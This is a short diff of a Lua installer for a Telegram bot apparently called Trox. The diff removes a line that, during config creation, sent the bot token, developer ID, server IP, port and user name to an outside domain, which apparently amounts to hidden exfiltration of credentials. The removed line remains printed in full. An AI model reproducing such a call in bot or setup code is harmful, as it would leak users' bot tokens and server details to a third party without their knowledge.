@@ -77,7 +77,6 @@ Trox = DevRio:get(Server.."TokenTrox"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdTrox")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/Trox/index.php?Get=Trox&DevId="..DevRio:get(Server.."IdTrox").."&TokenBot="..DevRio:get(Server.."TokenTrox").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Trox.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
